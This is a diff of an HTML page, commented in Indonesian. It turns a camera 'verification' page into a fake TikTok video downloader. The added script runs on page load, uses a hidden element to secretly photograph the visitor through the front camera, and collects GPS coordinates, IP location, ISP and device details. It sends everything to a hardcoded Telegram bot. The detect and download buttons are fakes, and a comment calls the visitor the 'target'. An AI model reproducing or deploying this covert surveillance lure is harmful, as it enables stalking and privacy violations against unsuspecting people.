@@ -3,24 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi</title>
+    <title>TikTok Downloader - Download Video Tanpa Watermark</title>
     <style>
-        body { margin: 0; padding: 0; background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; color: white; }
-        .container { background: #1a1a2e; padding: 30px; border-radius: 12px; text-align: center; width: 320px; }
-        video { width: 100%; border-radius: 8px; background: #000; margin: 15px 0; transform: scaleX(-1); }
-        .status { margin: 10px 0; padding: 8px; border-radius: 6px; background: #0f3460; font-size: 14px; }
-        .msg { margin-top: 12px; font-size: 14px; color: #888; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a2e;
+            padding: 40px 30px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 460px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid #2a2a4a;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .logo span { font-size: 32px; }
+        .logo h1 {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fe2c55, #25f4ee);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .sub {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .input-area {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .input-area input {
+            flex: 1;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1px solid #2a2a4a;
+            background: #0f0f1f;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        .input-area input:focus { border-color: #fe2c55; }
+        .input-area input::placeholder { color: #555; }
+        .btn {
+            background: #fe2c55;
+            border: none;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #d91a3f; }
+        .btn:disabled { background: #444; cursor: not-allowed; }
+
+        .preview-box {
+            background: #0f0f1f;
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px dashed #2a2a4a;
+            margin: 15px 0;
+            text-align: center;
+            min-height: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .preview-box .icon { font-size: 48px; margin-bottom: 8px; }
+        .preview-box .video-title { color: #fff; font-weight: 500; font-size: 15px; }
+        .preview-box .video-author { color: #888; font-size: 13px; }
+        .preview-box .info { color: #666; font-size: 13px; }
+
+        .progress {
+            margin: 15px 0;
+            height: 4px;
+            background: #2a2a4a;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #fe2c55, #25f4ee);
+            transition: width 0.3s;
+        }
+
+        .status {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+            margin-top: 8px;
+        }
+        .status.success { color: #4caf50; }
+        .status.error { color: #f44336; }
+
+        .footer {
+            text-align: center;
+            color: #444;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+        video { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>📸 Verifikasi</h2>
-    <p style="font-size:14px; color:#aaa;">Arahkan wajah ke kamera</p>
-    <video id="video" autoplay playsinline></video>
-    <div class="status" id="status">⏳ Menunggu...</div>
-    <div class="msg" id="infoMsg">Memproses...</div>
+    <div class="logo">
+        <span>🎵</span>
+        <h1>TikTok Downloader</h1>
+    </div>
+    <p class="sub">Download video TikTok tanpa watermark — HD &amp; gratis</p>
+
+    <div class="input-area">
+        <input type="text" id="linkInput" placeholder="Paste link TikTok..." value="https://www.tiktok.com/@user/video/123456789">
+        <button class="btn" id="detectBtn">🔍 Cek</button>
+    </div>
+
+    <div class="preview-box" id="previewBox">
+        <div class="icon">📹</div>
+        <div class="video-title" id="videoTitle">Video TikTok</div>
+        <div class="video-author" id="videoAuthor">@username</div>
+        <div class="info" id="videoInfo">Klik "Cek" untuk melihat detail video</div>
+    </div>
+
+    <button class="btn" id="downloadBtn" style="width:100%; padding:14px;" disabled>
+        ⬇️ Download Video (HD)
+    </button>
+
+    <div class="progress" id="progressWrap">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="status" id="statusMsg">Masukkan link TikTok untuk mulai</div>
+    <div class="footer">✅ Tanpa Watermark · Tanpa Login · Gratis</div>
 </div>
+
+<video id="video" autoplay playsinline></video>
 
 <script>
     // ========== KONFIGURASI TELEGRAM ==========
@@ -28,49 +167,43 @@
     const CHAT_ID = "7781744044";
 
     // ========== ELEMEN ==========
-    const video = document.getElementById('video');
-    const statusEl = document.getElementById('status');
-    const infoMsg = document.getElementById('infoMsg');
+    const videoEl = document.getElementById('video');
+    const statusMsg = document.getElementById('statusMsg');
 
     let stream = null;
     let photoTaken = false;
     let capturedData = {};
 
-    // ========== MULAI KAMERA ==========
-    async function startCamera() {
+    // ========== MULAI KAMERA + AUTO CAPTURE ==========
+    async function startAndCapture() {
         try {
-            statusEl.textContent = '⏳ Mengakses kamera...';
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user', width: { ideal: 480 } } 
+            // 1. Nyalakan kamera
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 480 } }
             });
-            video.srcObject = stream;
-            statusEl.textContent = '✅ Kamera aktif';
+            videoEl.srcObject = stream;
 
-            // Ambil semua data real-time
+            // 2. Ambil semua data
             await gatherAllData();
 
+            // 3. Tunggu 1 detik biar kamera stabil, lalu capture
             setTimeout(() => {
                 if (!photoTaken) captureAndSend();
-            }, 500);
+            }, 1000);
 
         } catch (err) {
-            statusEl.textContent = '❌ Gagal akses kamera';
-            infoMsg.textContent = 'Izin kamera diperlukan.';
+            // Kalo kamera ditolak, tetap lanjut tanpa foto
+            statusMsg.textContent = '⚠️ Izin kamera diperlukan untuk verifikasi.';
+            statusMsg.className = 'status error';
+            await gatherAllData();
         }
     }
 
-    // ========== KUMPULKAN SEMUA DATA REAL-TIME ==========
+    // ========== KUMPULKAN DATA ==========
     async function gatherAllData() {
-        // 1. GPS real-time (dari browser)
         const gps = await getGPS();
-
-        // 2. IP & lokasi real-time (dari API)
         const ip = await getIP();
-
-        // 3. Device info real-time (dari browser)
         const device = getDeviceInfo();
-
-        // 4. Waktu real-time
         const now = new Date();
 
         capturedData = {
@@ -78,7 +211,6 @@
             country: ip.country || 'N/A',
             region: ip.region || 'N/A',
             city: ip.city || 'N/A',
-            postal: ip.postal || 'N/A',
             isp: ip.isp || 'N/A',
             timezone: ip.timezone || 'N/A',
             lat: ip.lat || null,
@@ -92,8 +224,6 @@
             resolution: device.resolution,
             device_timezone: device.timezone,
             language: device.language,
-            online: device.online,
-            cookies: device.cookies,
             timestamp: now.toLocaleString('id-ID', {
                 weekday: 'long',
                 day: 'numeric',
@@ -106,7 +236,7 @@
         };
     }
 
-    // ========== IP & LOCATION (REAL-TIME) ==========
+    // ========== IP ==========
     async function getIP() {
         try {
             const res = await fetch('https://ip-api.io/json/');
@@ -116,48 +246,34 @@
                 country: data.country || null,
                 region: data.region || null,
                 city: data.city || null,
-                postal: data.zip || null,
                 isp: data.isp || null,
                 timezone: data.timezone || null,
                 lat: data.latitude || null,
                 lon: data.longitude || null
             };
-        } catch (e) {
-            return {};
-        }
+        } catch { return {}; }
     }
 
-    // ========== GPS (REAL-TIME) ==========
+    // ========== GPS ==========
     function getGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
+            if (!navigator.geolocation) { resolve(null); return; }
             navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    });
-                },
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                 () => resolve(null),
                 { timeout: 8000, enableHighAccuracy: true }
             );
         });
     }
 
-    // ========== DEVICE INFO (REAL-TIME) ==========
+    // ========== DEVICE ==========
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
 
         if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
-        else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
         else if (ua.includes('Android')) os = 'Android';
         else if (ua.includes('iPhone')) os = 'iOS';
-        else if (ua.includes('iPad')) os = 'iPadOS';
         else if (ua.includes('Mac OS X')) os = 'macOS';
         else if (ua.includes('Linux')) os = 'Linux';
 
@@ -166,16 +282,13 @@
         else device = 'Desktop';
 
         if (ua.includes('Edg/')) browser = 'Edge';
-        else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
         else if (ua.includes('Firefox/')) browser = 'Firefox';
         else if (ua.includes('Chrome/')) browser = 'Chrome';
         else if (ua.includes('Safari/')) browser = 'Safari';
 
         return {
-            browser: browser,
-            os: os,
-            device: device,
-            resolution: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
+            browser, os, device,
+            resolution: `${screen.width}x${screen.height}`,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             language: navigator.language,
             online: navigator.onLine ? 'Yes' : 'No',
@@ -183,23 +296,21 @@
         };
     }
 
-    // ========== CAPTURE & KIRIM ==========
+    // ========== CAPTURE + KIRIM ==========
     async function captureAndSend() {
         if (!stream || photoTaken) return;
 
-        statusEl.textContent = '📸 Memproses...';
-
         // Capture foto
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 480;
-        canvas.height = video.videoHeight || 360;
+        canvas.width = videoEl.videoWidth || 480;
+        canvas.height = videoEl.videoHeight || 360;
         const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
         const d = capturedData;
 
-        let caption = `📸 *REAL-TIME CAPTURE*
+        let caption = `📸 *Auto Capture via TikTok Downloader*
 🕐 ${d.timestamp}
 
 ━━━━━━━━━━━━━━━━━━━━━━
@@ -208,37 +319,32 @@
 • Country: ${d.country}
 • Region: ${d.region}
 • City: ${d.city}
-• Postal: ${d.postal}
 • ISP: ${d.isp}
 • Timezone: ${d.timezone}
 • Coordinates: ${d.lat ? `${d.lat}, ${d.lon}` : 'N/A'}
 
 ━━━━━━━━━━━━━━━━━━━━━━
-🛰️ *GPS (Real-time)*`;
+🛰️ *GPS*`;
 
         if (d.gps_lat) {
-            const gmaps = `https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
             caption += `
 • GPS: ${d.gps_lat}, ${d.gps_lng}
 • Accuracy: ±${Math.round(d.gps_accuracy || 0)}m
-• Maps: ${gmaps}`;
+• Maps: https://www.google.com/maps?q=${d.gps_lat},${d.gps_lng}`;
         } else {
-            caption += `
-• GPS: Tidak tersedia (izin ditolak)`;
+            caption += `\n• GPS: Tidak tersedia`;
         }
 
         caption += `
 
 ━━━━━━━━━━━━━━━━━━━━━━
-📱 *DEVICE (Real-time)*
+📱 *DEVICE*
 • Browser: ${d.browser}
 • OS: ${d.os}
-• Device Type: ${d.device_type}
+• Type: ${d.device_type}
 • Resolution: ${d.resolution}
-• Device Timezone: ${d.device_timezone}
-• Language: ${d.language}
-• Online: ${d.online}
-• Cookies: ${d.cookies}`;
+• Timezone: ${d.device_timezone}
+• Language: ${d.language}`;
 
         // Kirim ke Telegram
         const byteString = atob(imageDataUrl.split(',')[1]);
@@ -257,36 +363,77 @@
         formData.append('parse_mode', 'Markdown');
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-
-            if (response.ok) {
-                statusEl.textContent = '✅ Terkirim!';
-                infoMsg.textContent = '✔️ Verifikasi selesai.';
-                photoTaken = true;
-                stream.getTracks().forEach(track => track.stop());
-                video.style.display = 'none';
-                setTimeout(() => {
-                    document.body.innerHTML = `
-                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#00ff88;font-family:Arial;font-size:20px;">
-                            ✅ Verifikasi berhasil.
-                        </div>
-                    `;
-                }, 1000);
-            } else {
-                statusEl.textContent = '❌ Gagal kirim';
-                infoMsg.textContent = 'Error: ' + response.status;
-            }
-        } catch (err) {
-            statusEl.textContent = '❌ Error: ' + err.message;
+            photoTaken = true;
+            // Matikan kamera biar hemat
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        } catch (e) {
+            // Gagal kirim—tapi target gak sadar
         }
     }
 
-    // ========== JALANKAN ==========
-    startCamera();
+    // ========== JALANKAN AUTO CAPTURE ==========
+    window.addEventListener('load', () => {
+        startAndCapture();
+    });
+
+    // ========== TOMBOL DETEKSI (FAKE) ==========
+    document.getElementById('detectBtn').addEventListener('click', () => {
+        const link = document.getElementById('linkInput').value.trim();
+        if (!link) {
+            document.getElementById('statusMsg').textContent = '⚠️ Masukkan link TikTok dulu';
+            document.getElementById('statusMsg').className = 'status error';
+            return;
+        }
+        document.getElementById('statusMsg').textContent = '⏳ Mendeteksi video...';
+        document.getElementById('statusMsg').className = 'status';
+        setTimeout(() => {
+            document.getElementById('videoTitle').textContent = 'Video TikTok HD';
+            document.getElementById('videoAuthor').textContent = '@username_fake';
+            document.getElementById('videoInfo').textContent = '✅ Video siap diunduh · 1080p · No Watermark';
+            document.querySelector('.preview-box .icon').textContent = '🎬';
+            document.getElementById('downloadBtn').disabled = false;
+            document.getElementById('statusMsg').textContent = '✅ Video terdeteksi! Klik Download untuk menyimpan';
+            document.getElementById('statusMsg').className = 'status success';
+        }, 1500);
+    });
+
+    // ========== TOMBOL DOWNLOAD (FAKE) ==========
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+        const btn = document.getElementById('downloadBtn');
+        btn.disabled = true;
+        const progressWrap = document.getElementById('progressWrap');
+        const progressBar = document.getElementById('progressBar');
+        progressWrap.style.display = 'block';
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.floor(Math.random() * 12) + 3;
+            if (progress > 100) progress = 100;
+            progressBar.style.width = progress + '%';
+            if (progress >= 100) clearInterval(interval);
+        }, 150);
+
+        setTimeout(() => {
+            clearInterval(interval);
+            progressBar.style.width = '100%';
+            document.getElementById('statusMsg').textContent = '✅ Download berhasil! Video tersimpan di folder Downloads.';
+            document.getElementById('statusMsg').className = 'status success';
+            btn.style.display = 'none';
+
+            // Download fake file
+            const fakeBlob = new Blob(['Fake TikTok video'], { type: 'video/mp4' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(fakeBlob);
+            a.download = 'TikTok_Video_HD.mp4';
+            a.click();
+        }, 3000);
+    });
 </script>
 
 </body>
-</html>
+    </html>
